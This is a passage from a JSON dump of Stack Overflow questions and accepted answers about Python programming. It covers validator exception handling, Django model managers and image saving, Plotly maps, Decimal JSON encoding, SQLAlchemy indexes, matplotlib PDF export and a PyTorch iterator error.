changes.\n\nSplit the method into separate checks:\nclass Validator:\n    def validate(something) -> None:\n        self.validate_a(something)\n        self.validate_b(something)\n        self.validate_c(something)\n\n    def validate_a(something) -> None:\n        if a:\n            raise ErrorA()\n\n    def validate_b(something) -> None:\n        if b:\n            raise ErrorB()\n\n    def validate_c(something) -> None:\n        if c:\n            raise ErrorC()\n\n# In the caller module\n\nclass CustomValidator(Validator):\n    def validate(something) -> None:\n        super().validate_a(something)\n        super().validate_c(something)\n\nThis is just a slightly better copy-paste.\nIf some validate_d() is added later, we have a bug in CustomValidator.\n\nAdd some suppression logic by hand:\nclass Validator:\n    def validate(something, *, suppress: list[Type[Exception]] = []) -> None:\n        if a:\n            self._raise(ErrorA(), suppress)\n        if b:\n            self._raise(ErrorB(), suppress)\n        if c:\n            self._raise(ErrorC(), suppress)\n\n    def _raise(self, e: Exception, suppress: list[Type[Exception]]) -> None:\n        with contextlib.suppress(*suppress):\n            raise e\n\nThis is what I'm leaning towards at the moment.\nThere's a new optional parameter and the raise syntax becomes kinda ugly,\nbut this is an acceptable cost.\n\nAdd flags that disable some checks:\nclass Validator:\n    def validate(something, *, check_a: bool = True,\n                 check_b: bool = True, check_c: bool = True) -> None:\n        if check_a and a:\n            raise ErrorA()\n        if check_b and b:\n            raise ErrorB()       \n        if check_c and c:\n            raise ErrorC()\n\nThis is good, because it allows to granually control different checks even\nif they raise the same exception.\nHowever, it feels verbose and will require additional maintainance\nas Validator changes. I actually have more than three checks there.\n\nYield exceptions by value:\nclass Validator:\n    def validate(something) -> Iterator[Exception]:\n        if a:\n            yield ErrorA()\n        if b:\n            yield ErrorB()\n        if c:\n            yield ErrorC()\n\nThis is bad, because it's a breaking change for existing callers\nand it makes propagating the exception (the typical use) way more verbose:\n# Instead of\n# validator.validate(something)\n\ne = next(validator.validate(something), None)\nif e is not None:\n    raise e\n\nEven if we keep everything backwards-compatible\nclass Validator:\n    def validate(something) -> None:\n        e = next(self.iter_errors(something), None)\n        if e is not None:\n            raise e\n\n    def iter_errors(something) -> Iterator[Exception]:\n        if a:\n            yield ErrorA()\n        if b:\n            yield ErrorB()\n        if c:\n            yield ErrorC()\n\nThe new suppressing caller still needs to write all this code:\nexceptions = validator.iter_errors(something)\ne = next(exceptions, None)\nif isinstance(e, ErrorB):\n    # Skip ErrorB, don't raise it.\n    e = next(exceptions, None)\nif e is not None:\n    raise e\n\nCompared to the previous two options:\nvalidator.validate(something, suppress=[ErrorB])\n\nvalidator.validate(something, check_b=False)\n\n\n\n",
    "AcceptedAnswerId": 73662557,
    "AcceptedAnswer": "With bare exceptions you are looking at the wrong tool for the job. In Python, to raise an exception means that execution hits an exceptional case in which resuming is not possible. Terminating the broken execution is an express purpose of exceptions.\n\nExecution Model: 4.3. Exceptions\nPython uses the \u201ctermination\u201d model of error handling: an exception handler can find out what happened and continue execution at an outer level, but it cannot repair the cause of the error and retry the failing operation (except by re-entering the offending piece of code from the top).\n\nTo get resumption semantics for exception handling, you can look at the generic tools for either resumption or for handling.\n\nResumption: Coroutines\nPython's resumption model are coroutines: yield coroutine-generators or async coroutines both allow to pause and explicitly resume execution.\ndef validate(something) -> Iterator[Exception]:\n    if a:\n        yield ErrorA()\n    if b:\n        yield ErrorB()\n    if c:\n        yield ErrorC()\n\nIt is important to distinguish between send-style \"proper\" coroutines and iterator-style \"generator\" coroutines. As long as no value must be sent into the coroutine, it is functionally equivalent to an iterator. Python has good inbuilt support for working with iterators:\nfor e in validator.iter_errors(something):\n    if isinstance(e, ErrorB):\n        continue  # continue even if ErrorB happens\n    raise e\n\nSimilarly, one could filter the iterator or use comprehensions. Iterators easily compose and gracefully terminate, making them suitable for iterating exception cases.\n\nEffect Handling\nException handling is just the common use case for the more generic effect handling. While Python has no builtin effect handling support, simple handlers that address only the origin or sink of an effect can be modelled just as functions:\ndef default_handler(failure: BaseException):\n    raise failure\n\ndef validate(something, failure_handler = default_handler) -> None:\n    if a:\n        failure_handler(ErrorA())\n    if b:\n        failure_handler(ErrorB())\n    if c:\n        failure_handler(ErrorC())\n\nThis allows the caller to change the effect handling by supplying a different handler.\ndef ignore_b_handler(failure: BaseException):\n    if not isinstance(failure, ErrorB):\n        raise failure\n\nvalidate(..., ignore_b_handler)\n\nThis might seem familiar to dependency inversion and is in fact related to it.\nThere are various stages of buying into effect handling, and it is possible to reproduce much if not all features via classes. Aside from technical functionality, one can implement ambient effect handlers (similar to how try \"connects\" to raise automatically) via thread local or context-local variables.\n"
}
{
    "Id": 73820642,
    "PostTypeId": 1,
    "Title": "Always Defer a Field in Django",
    "Body": "How do I make a field on a Django model deferred for all queries of that model without needing to put a defer on every query?\nResearch\nThis was requested as a feature in 2014 and rejected in 2022.\nBaring such a feature native to Django, the obvious idea is to make a custom manager like this:\nclass DeferedFieldManager(models.Manager):\n\n    def __init__(self, defered_fields=[]):\n        super().__init__()\n        self.defered_fields = defered_fields\n\n    def get_queryset(self, *args, **kwargs):\n        return super().get_queryset(*args, **kwargs\n            ).defer(*self.defered_fields)\n\nclass B(models.Model):\n    pass\n\nclass A(models.Model):\n    big_field = models.TextField(null=True)\n    b = models.ForeignKey(B, related_name=\"a_s\")\n\n    objects = DeferedFieldManager([\"big_field\"])\n\nclass C(models.Model):\n    a = models.ForeignKey(A)\n\nclass D(models.Model):\n    a = models.OneToOneField(A)\n\nclass E(models.Model):\n    a_s = models.ManyToManyField(A)\n\n\nHowever, while this works for A.objects.first() (direct lookups), it doesn't work for B.objects.first().a_s.all() (one-to-manys), C.objects.first().a (many-to-ones), D.objects.first().a (one-to-ones), or E.objects.first().a_s.all() (many-to-manys).\nThe thing I find particularly confusing here is that this is the default manager for my object, which means it should also be the default for the reverse lookups (the one-to-manys and many-to-manys), yet this isn't working.  Per the Django docs:\n\nBy default the RelatedManager used for reverse relations is a subclass of the default manager for that model.\n\nAn easy way to test this is to drop the field that should be deferred from the database, and the code will only error with an OperationalError: no such column if the field is not properly deferred.  To test, do the following steps:\n\nData setup:\nb = B.objects.create()\na = A.objects.create(b=b)\nc = C.objects.create(a=a)\nd = D.objects.create(a=a)\ne = E.objects.create()\ne.a_s.add(a)\n\n\nComment out big_field\nmanage.py makemigrations\nmanage.py migrate\nComment in big_field\nRun tests:\nfrom django.db import OperationalError\ndef test(test_name, f, attr=None):\n    try:\n        if attr:\n            x = getattr(f(), attr)\n        else:\n            x = f()\n        assert isinstance(x, A)\n        print(f\"{test_name}:\\tpass\")\n    except OperationalError:\n        print(f\"{test_name}:\\tFAIL!!!\")\n\ntest(\"Direct Lookup\", A.objects.first)\ntest(\"One-to-Many\", B.objects.first().a_s.first)\ntest(\"Many-to-One\", C.objects.first, \"a\")\ntest(\"One-to-One\", D.objects.first, \"a\")\ntest(\"Many-to-Many\", E.objects.first().a_s.first)\n\n\n\nIf the tests above all pass, the field has been properly deferred.\nI'm currently getting:\nDirect Lookup:  pass\nOne-to-Many:    FAIL!!!\nMany-to-One:    FAIL!!!\nOne-to-One:     FAIL!!!\nMany-to-Many:   FAIL!!!\n\nPartial Answer\n@aaron's answer solves half of the failing cases.\nIf I change A to have:\nclass Meta:\n    base_manager_name = 'objects'\n\nI now get the following from tests:\nDirect Lookup:  pass\nOne-to-Many:    FAIL!!!\nMany-to-One:    pass\nOne-to-One:     pass\nMany-to-Many:   FAIL!!!\n\nThis still does not work for the revere lookups.\n",
    "AcceptedAnswerId": 73938166,
    "AcceptedAnswer": "Set Meta.base_manager_name to 'objects'.\nclass A(models.Model):\n    big_field = models.TextField(null=True)\n    b = models.ForeignKey(B, related_name=\"a_s\")\n\n    objects = DeferedFieldManager([\"big_field\"])\n\n    class Meta:\n        base_manager_name = 'objects'\n\nFrom https://docs.djangoproject.com/en/4.1/topics/db/managers/#using-managers-for-related-object-access:\n\nUsing managers for related object access\nBy default, Django uses an instance of the Model._base_manager manager class when accessing related objects (i.e. choice.question), not the _default_manager on the related object. This is because Django needs to be able to retrieve the related object, even if it would otherwise be filtered out (and hence be inaccessible) by the default manager.\nIf the normal base manager class (django.db.models.Manager) isn\u2019t appropriate for your circumstances, you can tell Django which class to use by setting Meta.base_manager_name.\n\nReverse Many-to-One and Many-to-Many managers\nThe \"One-To-Many\" case in the question is a Reverse Many-To-One.\nDjango subclasses the manager class to override the behaviour, and then instantiates it \u2014 without the defered_fields argument passed to __init__ since\ndjango.db.models.Manager and its subclasses are not expected to have parameters.\nThus, you need something like:\ndef make_defered_field_manager(defered_fields):\n    class DeferedFieldManager(models.Manager):\n        def get_queryset(self, *args, **kwargs):\n            return super().get_queryset(*args, **kwargs).defer(*defered_fields)\n    return DeferedFieldManager()\n\nUsage:\n# objects = DeferedFieldManager([\"big_field\"])\nobjects = make_defered_field_manager([\"big_field\"])\n\n"
}
{
    "Id": 73668088,
    "PostTypeId": 1,
    "Title": "Can we use Plotly Express to plot zip codes?",
    "Body": "I'm using the code from this link.\nhttps://devskrol.com/2021/12/27/choropleth-maps-using-python/\nHere's my actual code.\nimport plotly.express as px\n \nfrom urllib.request import urlopen\nimport json\nwith urlopen('https://raw.githubusercontent.com/plotly/datasets/master/geojson-counties-fips.json') as response:\n    counties = json.load(response)\n    \n#import libraries\nimport pandas as pd\nimport plotly.express as px\n \n\nfig = px.choropleth(df_mover, geojson=counties, \n                    locations='my_zip', \n                    locationmode=\"USA-states\", \n                    color='switcher_flag',\n                    range_color=(10000, 100000),\n                    scope=\"usa\"\n                    )\nfig.update_layout(margin={\"r\":0,\"t\":0,\"l\":0,\"b\":0})\nfig.show()\n\nI'm simply trying to pass in data from my dataframe named df_movers, which has two fields: my_zip and switcher_flag. When I run this in a Jupyter notebook, it just runs and runs; it never stops. I'm only trying to plot 25 records, so it's not like there's too much data here. Finally, my_zip is data type object. Any idea what could be wrong here?\n",
    "AcceptedAnswerId": 73669375,
    "AcceptedAnswer": "Since you did not provide any user data, I tried your code with data including US zip codes from here. I think the issue is that you don't need to specify the location mode. I specified county_fips for the location and population for the color fill.\nimport plotly.express as px\nfrom urllib.request import urlopen\nimport json\nwith urlopen('https://raw.githubusercontent.com/plotly/datasets/master/geojson-counties-fips.json') as response:\n    counties = json.load(response)\n    \n#import libraries\nimport pandas as pd\nus_zip = pd.read_csv('data/uszips.csv', dtype={'county_fips': str}) \n\nfig = px.choropleth(us_zip,\n                    geojson=counties, \n                    locations='county_fips', \n                    #locationmode=\"USA-states\", \n                    color='population',\n                    range_color=(1000, 10000),\n                    scope=\"usa\"\n                    )\nfig.update_layout(margin={\"r\":0,\"t\":0,\"l\":0,\"b\":0})\nfig.show()\n\n\n"
}
{
    "Id": 73070247,
    "PostTypeId": 1,
    "Title": "how to change image format when uploading image in django?",
    "Body": "When a user uploads an image from the Django admin panel, I want to change the image format to '.webp'. I have overridden the save method of the model. Webp file is generated in the media/banner folder but the generated file is not saved in the database. How can I achieve that?\ndef save(self, *args, **kwargs):\n    super(Banner, self).save(*args, **kwargs)\n    im = Image.open(self.image.path).convert('RGB')\n    name = 'Some File Name with .webp extention' \n    im.save(name, 'webp')\n    self.image = im\n\nBut After saving the model, instance of the Image class not saved in the database?\nMy Model Class is :\nclass Banner(models.Model):\n    image = models.ImageField(upload_to='banner')\n    device_size = models.CharField(max_length=20, choices=Banner_Device_Choice)\n\n",
    "AcceptedAnswerId": 73430147,
    "AcceptedAnswer": "from django.core.files import ContentFile\n\nIf you already have the webp file, read the webp file, put it into the ContentFile() with a buffer (something like io.BytesIO). Then you can proceed to save the ContentFile() object to a model. Do not forget to update the model field, and save the model!\nhttps://docs.djangoproject.com/en/4.1/ref/files/file/\nAlternatively\n\n\"django-webp-converter is a Django app which straightforwardly converts static images to WebP images, falling back to the original static image for unsupported browsers.\"\n\nIt might have some save capabilities too.\nhttps://django-webp-converter.readthedocs.io/en/latest/\nThe cause\nYou are also saving in the wrong order, the correct order to call the super().save() is at the end.\nEdited, and tested solution:\nfrom django.core.files import ContentFile\nfrom io import BytesIO\n\ndef save(self, *args, **kwargs):\n    #if not self.pk: #Assuming you don't want to do this literally every time an object is saved.\n    img_io = BytesIO()\n    im = Image.open(self.image).convert('RGB')\n    im.save(img_io, format='WEBP')\n    name=\"this_is_my_webp_file.webp\"\n    self.image = ContentFile(img_io.getvalue(), name)\n    super(Banner, self).save(*args, **kwargs) #Not at start  anymore\n    \n\n    \n\n"
}
{
    "Id": 74017216,
    "PostTypeId": 1,
    "Title": "Deserialize json string containing arbitrary-precision float numbers, and serialize it back",
    "Body": "Python has no built-in arbitrary-precision floats. Here is an example:\n>>> float(4.4257052820783003)\n4.4257052820783\n\nSo it doesn't matter what you use, you can't have a float object with arbitrary precision.\nLet's say I have a JSON string (json_string = '{\"abc\": 4.4257052820783003}') containing an arbitrary-precision float. If I load that string, Python will cut the number:\n>>> dct = json.loads(json_string)\n>>> dct\n{'abc': 4.4257052820783}\n\nI managed to avoid this loss of info by using decimal.Decimal:\n>>> dct = json.loads(json_string, parse_float=Decimal)\n>>> dct\n{'abc': Decimal('4.4257052820783003')}\n\nNow, I would like to serialize this dct object to the original JSON formatted string. json.dumps(dct) clearly does not work (because objects of type Decimal are not JSON serializable). I tried to subclass json.JSONEncoder and redefine its default method:\nclass MyJSONEncoder(json.JSONEncoder):\n    def default(self, o):\n        if isinstance(o, Decimal):\n            return str(o)\n        return super().default(o)\n\nBut this is clearly creating a string instead of a number:\n>>> MyJSONEncoder().encode(dct)\n'{\"abc\": \"4.4257052820783003\"}'\n\nHow can I serialize a Decimal object to a JSON number (real) instead of a JSON string? In other words, I want the encode operation to return the original json_string string. Ideally without using external packages (but solutions using external packages are still welcome).\nThis question is of course very related but I can't find an answer there: Python JSON serialize a Decimal object.\n",
    "AcceptedAnswerId": 74106182,
    "AcceptedAnswer": "The following only uses the default library. It works by effectively \"overriding\" json.encoder._make_iterencode (see discussion below, after this example)...\nfrom decimal import Decimal\nimport json\n\ndef _our_make_iterencode(markers, _default, _encoder, _indent, _floatstr,\n        _key_separator, _item_separator, _sort_keys, _skipkeys, _one_shot,\n        ## HACK: hand-optimized bytecode; turn globals into locals\n        ValueError=ValueError,\n        dict=dict,\n        float=float,\n        id=id,\n        int=int,\n        isinstance=isinstance,\n        list=list,\n        str=str,\n        tuple=tuple,\n        _intstr=int.__repr__,\n    ):\n\n    if _indent is not None and not isinstance(_indent, str):\n        _indent = ' ' * _indent\n\n    def _iterencode_list(lst, _current_indent_level):\n\n        if not lst:\n            yield '[]'\n            return\n        if markers is not None:\n            markerid = id(lst)\n            if markerid in markers:\n                raise ValueError(\"Circular reference detected\")\n            markers[markerid] = lst\n        buf = '['\n        if _indent is not None:\n            _current_indent_level += 1\n            newline_indent = '\\n' + _indent * _current_indent_level\n            separator = _item_separator + newline_indent\n            buf += newline_indent\n        else:\n            newline_indent = None\n            separator = _item_separator\n        first = True\n        for value in lst:\n            if first:\n                first = False\n            else:\n                buf = separator\n            if isinstance(value, str):\n                yield buf + _encoder(value)\n            elif value is None:\n                yield buf + 'null'\n            elif value is True:\n                yield buf + 'true'\n            elif value is False:\n                yield buf + 'false'\n            elif isinstance(value, int):\n                # Subclasses of int/float may override __repr__, but we still\n                # want to encode them as integers/floats in JSON. One example\n                # within the standard library is IntEnum.\n                yield buf + _intstr(value)\n            elif isinstance(value, float):\n                # see comment above for int\n                yield buf + _floatstr(value)\n            else:\n                yield buf\n                if isinstance(value, (list, tuple)):\n                    chunks = _iterencode_list(value, _current_indent_level)\n                elif isinstance(value, dict):\n                    chunks = _iterencode_dict(value, _current_indent_level)\n                else:\n                    chunks = _iterencode(value, _current_indent_level)\n                yield from chunks\n        if newline_indent is not None:\n            _current_indent_level -= 1\n            yield '\\n' + _indent * _current_indent_level\n        yield ']'\n        if markers is not None:\n            del markers[markerid]\n\n    def _iterencode_dict(dct, _current_indent_level):\n        if not dct:\n            yield '{}'\n            return\n        if markers is not None:\n            markerid = id(dct)\n            if markerid in markers:\n                raise ValueError(\"Circular reference detected\")\n            markers[markerid] = dct\n        yield '{'\n        if _indent is not None:\n            _current_indent_level += 1\n            newline_indent = '\\n' + _indent * _current_indent_level\n            item_separator = _item_separator + newline_indent\n            yield newline_indent\n        else:\n            newline_indent = None\n            item_separator = _item_separator\n        first = True\n        if _sort_keys:\n            items = sorted(dct.items())\n        else:\n            items = dct.items()\n        for key, value in items:\n            if isinstance(key, str):\n                pass\n            # JavaScript is weakly typed for these, so it makes sense to\n            # also allow them.  Many encoders seem to do something like this.\n            elif isinstance(key, float):\n                # see comment for int/float in _make_iterencode\n                key = _floatstr(key)\n            elif key is True:\n                key = 'true'\n            elif key is False:\n                key = 'false'\n            elif key is None:\n                key = 'null'\n            elif isinstance(key, int):\n                # see comment for int/float in _make_iterencode\n                key = _intstr(key)\n            elif _skipkeys:\n                continue\n            else:\n                raise TypeError(f'keys must be str, int, float, bool or None, '\n                                f'not {key.__class__.__name__}')\n            if first:\n                first = False\n            else:\n                yield item_separator\n            yield _encoder(key)\n            yield _key_separator\n            if isinstance(value, str):\n                yield _encoder(value)\n            elif value is None:\n                yield 'null'\n            elif value is True:\n                yield 'true'\n            elif value is False:\n                yield 'false'\n            elif isinstance(value, int):\n                # see comment for int/float in _make_iterencode\n                yield _intstr(value)\n            elif isinstance(value, float):\n                # see comment for int/float in _make_iterencode\n                yield _floatstr(value)\n            else:\n                if isinstance(value, (list, tuple)):\n                    chunks = _iterencode_list(value, _current_indent_level)\n                elif isinstance(value, dict):\n                    chunks = _iterencode_dict(value, _current_indent_level)\n                else:\n                    chunks = _iterencode(value, _current_indent_level)\n                yield from chunks\n        if newline_indent is not None:\n            _current_indent_level -= 1\n            yield '\\n' + _indent * _current_indent_level\n        yield '}'\n        if markers is not None:\n            del markers[markerid]\n\n    def _iterencode(o, _current_indent_level):\n        if isinstance(o, str):\n            yield _encoder(o)\n        elif isinstance(o, Decimal):\n            yield str(o) # unquoted string.\n        elif o is None:\n            yield 'null'\n        elif o is True:\n            yield 'true'\n        elif o is False:\n            yield 'false'\n        elif isinstance(o, int):\n            # see comment for int/float in _make_iterencode\n            yield _intstr(o)\n        elif isinstance(o, float):\n            # see comment for int/float in _make_iterencode\n            yield _floatstr(o)\n        elif isinstance(o, (list, tuple)):\n            yield from _iterencode_list(o, _current_indent_level)\n        elif isinstance(o, dict):\n            yield from _iterencode_dict(o, _current_indent_level)\n        else:\n            if markers is not None:\n                markerid = id(o)\n                if markerid in markers:\n                    raise ValueError(\"Circular reference detected\")\n                markers[markerid] = o\n            o = _default(o)\n            yield from _iterencode(o, _current_indent_level)\n            if markers is not None:\n                del markers[markerid]\n    return _iterencode\n\nclass BigDecimalJSONEncoder(json.JSONEncoder):\n \n    def iterencode(self, o, _one_shot=False):\n        \"\"\"Encode the given object and yield each string\n        representation as available.\n\n        For example::\n\n            for chunk in JSONEncoder().iterencode(bigobject):\n                mysocket.write(chunk)\n\n        \"\"\"\n        if self.check_circular:\n            markers = {}\n        else:\n            markers = None\n        if self.ensure_ascii:\n            _encoder = json.encoder.encode_basestring_ascii\n        else:\n            _encoder = json.encoder.encode_basestring\n\n        def floatstr(o, allow_nan=self.allow_nan,\n                _repr=float.__repr__, _inf=json.encoder.INFINITY, _neginf=-json.encoder.INFINITY):\n            # Check for specials.  Note that this type of test is processor\n            # and/or platform-specific, so do tests which don't depend on the\n            # internals.\n\n            if o != o:\n                text = 'NaN'\n            elif o == _inf:\n                text = 'Infinity'\n            elif o == _neginf:\n                text = '-Infinity'\n            else:\n                return _repr(o)\n\n            if not allow_nan:\n                raise ValueError(\n                    \"Out of range float values are not JSON compliant: \" +\n                    repr(o))\n\n            return text\n\n        _one_shot = False\n        if (_one_shot and json.encoder.c_make_encoder is not None\n                and self.indent is None):\n            _iterencode = json.encoder.c_make_encoder(\n                markers, self.default, _encoder, self.indent,\n                self.key_separator, self.item_separator, self.sort_keys,\n                self.skipkeys, self.allow_nan)\n        else:\n            _iterencode = _our_make_iterencode(\n                markers, self.default, _encoder, self.indent, floatstr,\n                self.key_separator, self.item_separator, self.sort_keys,\n                self.skipkeys, _one_shot)\n        return _iterencode(o, 0)\n\njson_string = '{\"abc\": 4.4257052820783003}'\ndct = json.loads(json_string, parse_float=Decimal)\nprint(f\"decoded={dct}\")\nprint(f\"encoded={json.dumps(dct, cls=BigDecimalJSONEncoder, indent=4)}\")\n\nExample output:\ndecoded={'abc': Decimal('4.4257052820783003')}\nencoded={\n    \"abc\": 4.4257052820783003\n}\n\nDiscussion:\nThe main problem is that json.encoder does not provide an acceptable way to override json.JSONEncoder to a return string (i.e., from json.JSONEncoder.default) that is to be accepted as raw ready-to-go JSON string.\nFor example, consider the following pseudo ideal override...\nclass IdealDecimalEncoder(json.JSONEncoder):\n    def default(self, o) -> Union[Any, tuple[str, bool]]:\n        if isinstance(o, Decimal):\n            return str(o), False # return object (str) and False which means \"do not quote\".\n        return super().default(o)\n\nThe above allows default to return the object (as it does today) or a tuple, where the second value is False if no further encoding should be performed (i.e., a string that should not be quoted). As we know, this is not supported.\nThe next question would then be, what lies between the call to default and iterencode... unfortunately, it's the json.encoder._make_iterencode function which essentially produces a generator that relies on several \"private\" functions. If this were a class, or if the functions were broken out and accessible, you could perform a more terse override.\nIn my working example above, I essentially copy/pasted _make_iterencode simply to add the following single case to the private _iterencode generator...\n    ...\n    elif isinstance(o, Decimal):\n        yield str(o) # unquoted string.\n    ...\n\nThis obviously works because it returns an unquoted string. The 'str' case always uses _encoder which assumes a string requiring quotes for JSON, where the override bypasses that for Decimal.\nNot a great solution but the only reasonable one I can see which uses only the built-in library which does not require parsing/decoding/modifying encoded JSON during the encoding process.\nIt has not been tested beyond the @Riccardo Bucco (OP)'s example.\nAssuming no unforeseen back-compat issue, it seems it would be a relatively easy to modify Python to include this for Decimal.\nWithout something built in, I'm wondering if it's best, for now, to use one of the other JSON libraries supporting Decimal as others have discussed.\n"
}
{
    "Id": 73623986,
    "PostTypeId": 1,
    "Title": "SQLAlchemy How to create a composite index between a polymorphic class and it's subclass",
    "Body": "I am trying to get a composite index working between a polymorphic subclass and it's parent.\nAlembic autogenerate does not seem to detect Indexes outside of __table_args__.\nI can't use __table_args__ because, being in the subclass, it does not count my class as having a __table__.\nHow do I create a composite Index between these?\nclass Main(Base, SomeMixin):\n    __tablename__ = \"main\"\n    __table_args__ = (\n        # Some constraints and Indexes specific to main\n    )\n\n    id = Column(String, primary_key=True, default=func.generate_object_id())\n\n    mtype = Column(String, nullable=False)\n\n    __mapper_args__ = {\"polymorphic_on\": mtype}\n\nclass SubClass(Main):\n    __mapper_args__ = {\"polymorphic_identity\": \"subclass\"}\n\n    bid = Column(String, ForeignKey(\"other.id\", ondelete=\"CASCADE\"))\n\n    # My index specific to Subclass\n    Index(\n        \"ix_main_bid_mtype\",\n        \"bid\",\n        \"mtype\",\n    )\n\nThe goal is to have something like this pop with alembic autogenerate:\ndef upgrade():\n    # ### commands auto generated by Alembic - please adjust! ###\n    op.create_index(\n        \"ix_main_bid_mtype\",\n        \"main\",\n        [\"bid\", \"mtype\"],\n        unique=False,\n    )\n    # ### end Alembic commands ###\n\n\ndef downgrade():\n    # ### commands auto generated by Alembic - please adjust! ###\n    op.drop_index(op.f(\"ix_main_bid_mtype\"), table_name=\"main\")\n    # ### end Alembic commands ###\n\nThank you for your time and potential future help.\nEDIT:\nNote: The other fields are detected by autogenerate, only the index done this way does not seem to work.\n",
    "AcceptedAnswerId": 73675717,
    "AcceptedAnswer": "Create the index externally after both classes:\nclass Main(Base, SomeMixin):\n    __tablename__ = \"main\"\n    __table_args__ = (\n        # Some constraints and Indexes specific to main\n    )\n\n    id = Column(String, primary_key=True, default=func.generate_object_id())\n\n    mtype = Column(String, nullable=False)\n\n    __mapper_args__ = {\"polymorphic_on\": mtype}\n\n\nclass SubClass(Main):\n    __mapper_args__ = {\"polymorphic_identity\": \"subclass\"}\n\n    bid = Column(String, ForeignKey(\"other.id\", ondelete=\"CASCADE\"))\n\n\nIndex(\"ix_main_bid_mtype\", SubClass.bid, SubClass.mtype)\n\n"
}
{
    "Id": 73485081,
    "PostTypeId": 1,
    "Title": "Save the multiple images into PDF without chainging the format of Subplot",
    "Body": "I've a df like this as shown below. What I'm doing is I'm trying to loop through the df column(s) with paths & printing the image as sub plots one column with image paths at axis0 and other column paths parallely on axis1 as follows.\n      identity       VGG-Face_cosine    img                 comment\n0   ./clip_v4/3.png   1.110223e-16  .\\clip_v3\\0.png        .\\clip_v3\\0.png is matched with ./clip_v4/3.png\n0   ./clip_v4/2.png   2.220446e-16  .\\clip_v3\\1.png        .\\clip_v3\\1.png is matched with ./clip_v4/2.png\n1   ./clip_v4/4.png   2.220446e-16  .\\clip_v3\\1.png        .\\clip_v3\\1.png is matched with ./clip_v4/4.png\n2   ./clip_v4/5.png   2.220446e-16  .\\clip_v3\\1.png        .\\clip_v3\\1.png is matched with ./clip_v4/5.png\n0   ./clip_v4/2.png   2.220446e-16  .\\clip_v3\\2.png        .\\clip_v3\\2.png is matched with \n\nI'm looping through these 2 columns identity  and  img columns & plotting as follows\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport matplotlib.image as mpimg\nfrom matplotlib import rcParams\n\n\ndf = df.iloc[1:]\n#merged_img = []\n\n\nfor index, row in df.iterrows():\n\n    # figure size in inches optional\n    rcParams['figure.figsize'] = 11 ,8\n\n    # read images\n    \n    img_A = mpimg.imread(row['identity'])\n    img_B = mpimg.imread(row['img'])\n\n    # display images\n    fig, ax = plt.subplots(1,2)\n \n    \n    ax[0].imshow(img_A)\n    ax[1].imshow(img_B)\n    \n    \n\nsample output I got.\n###Console output\n\nUpto now it's fine. My next idea is to save these images as it is with sublots on PDF. I don't want to change the structure the way it prints. Like I just want 2 images side by side in PDF too. I've went through many available solutions. But, I can't relate my part of code with the logic avaiable in documentation. Is there is any way to achieve my goal?. Any references would be helpful!!. Thanks in advance.\n",
    "AcceptedAnswerId": 73530424,
    "AcceptedAnswer": "Use PdfPages from matplotlib.backends.backend_pdf to save figures one by one on separate pages of the same pdf-file:\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport matplotlib.image as mpimg\nfrom matplotlib import rcParams\nfrom matplotlib.backends.backend_pdf import PdfPages\n\ndf = df.iloc[1:]\nrcParams['figure.figsize'] = 11 ,8\npdf_file_name = 'my_images.pdf' \n\nwith PdfPages(pdf_file_name) as pdf:\n\n    for index, row in df.iterrows():\n        img_A = mpimg.imread(row['identity'])\n        img_B = mpimg.imread(row['img'])\n        fig, ax = plt.subplots(1,2)\n        ax[0].imshow(img_A)\n        ax[1].imshow(img_B)\n\n        # save the current figure at a new page in pdf_file_name\n        pdf.savefig()   \n\nSee also https://matplotlib.org/stable/api/backend_pdf_api.html\n"
}
{
    "Id": 74289077,
    "PostTypeId": 1,
    "Title": "AttributeError: '_MultiProcessingDataLoaderIter' object has no attribute 'next'",
    "Body": "I am trying to load the dataset using Torch Dataset and DataLoader, but I got the following error:\nAttributeError: '_MultiProcessingDataLoaderIter' object has no attribute 'next'\n\nthe code I use is:\nclass WineDataset(Dataset):\n\n    def __init__(self):\n        # Initialize data, download, etc.\n        # read with numpy or pandas\n        xy = np.loadtxt('./data/wine.csv', delimiter=',', dtype=np.float32, skiprows=1)\n        self.n_samples = xy.shape[0]\n\n        # here the first column is the class label, the rest are the features\n        self.x_data = torch.from_numpy(xy[:, 1:]) # size [n_samples, n_features]\n        self.y_data = torch.from_numpy(xy[:, [0]]) # size [n_samples, 1]\n\n    # support indexing such that dataset[i] can be used to get i-th sample\n    def __getitem__(self, index):\n        return self.x_data[index], self.y_data[index]\n\n    # we can call len(dataset) to return the size\n    def __len__(self):\n        return self.n_samples\n\n    dataset = WineDataset()\n        \n    train_loader = DataLoader(dataset=dataset,\n                              batch_size=4,\n                              shuffle=True,\n                              num_workers=2)\n\nI tried to make the num_workers=0, still have the same error.\nPython version 3.8.9\nPyTorch version 1.13.0\n\n",
    "AcceptedAnswerId": 74331018,
    "AcceptedAnswer": "I too faced the same issue, when i tried to call the next() method as follows\ndataiter = iter(dataloader)\ndata = dataiter.next()\n\nYou need to use the following instead and it works perfectly:\ndataiter = iter(dataloader)\ndata = next(dataiter)\n\nFinally your code should look like follows:\nclass WineDataset(Dataset):\n\n    def __init__(self):\n        # Initialize data, download, etc.\n        # read with numpy or pandas\n        xy = np.loadtxt('./data/wine.csv', delimiter=',', dtype=np.float32, skiprows=1)\n        self.n_samples = xy.shape[0]\n\n        # here the first column is the class label, the rest are the features\n        self.x_data = torch.from_numpy(xy[:, 1:]) # size [n_samples, n_features]\n        self.y_data = torch.from_numpy(xy[:, [0]]) # size [n_samples, 1]\n\n    # support indexing such that dataset[i] can be used to get i-th sample\n    def __getitem__(self, index):\n        return self.x_data[index], self.y_data[index]\n\n    # we can call len(dataset) to return the size\n    def __len__(self):\n        return self.n_samples\n\n    dataset = WineDataset()\n        \n    train_loader = DataLoader(dataset=dataset,\n                              batch_size=4,\n                              shuffle=True,\n                              num_workers=2)\n\ndataiter = iter(dataloader)\ndata = next(dataiter)\n\n"
}
{
    "Id": 73719101,
    "PostTypeId": 1,
    "Title": "Connecting a C++ program to a Python script with shared memory",
